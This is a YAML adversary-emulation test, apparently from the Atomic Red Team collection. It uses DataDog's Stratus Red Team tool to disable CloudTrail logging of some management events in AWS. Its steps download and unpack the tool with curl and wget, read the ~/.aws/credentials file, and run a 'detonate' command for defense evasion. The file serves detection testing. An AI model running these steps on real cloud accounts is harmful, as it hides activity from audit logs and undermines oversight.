api_version: "2.0"
name: AWS - Disable CloudTrail Logging Through Event Selectors using Stratus
description: |
    Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/
args:
    - name: stratus_path
      type: path
      default: $PathToAtomicsFolder/T1562.008/src
    - name: aws_region
      type: string
      default: us-west-2
uuid: a27418de-bdce-4ebd-b655-38f11142bf0c
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1562: Impair Defenses'
    subtechniques:
        - 'T1562.008: Disable or Modify Cloud Logs'
requirements:
    platforms:
        - os: linux
        - os: darwin
        - os: iaas:aws
steps:
    - name: |
        Stratus binary must be present at the (#{stratus_path}/stratus)
      inline: "if [ -f #{stratus_path}/stratus ]; then exit 0; else {if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n}; fi;\n"
      executor: sh
    - name: |
        Check if ~/.aws/credentials file has a default stanza is configured
      inline: |
        cat ~/.aws/credentials | grep "default"
      executor: sh
    - name: aws---disable-cloudtrail-logging-through-event-selectors-using-stratus
      inline: "export AWS_REGION={{.Args.aws_region}} \ncd {{.Args.stratus_path}}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n"
      executor: sh
      cleanup:
        inline: |
            export AWS_REGION={{.Args.aws_region}}
            echo "Cleanup detonation"
            cd {{.Args.stratus_path}}
            ./stratus cleanup --all
            rm -rf stratus*
        executor: sh
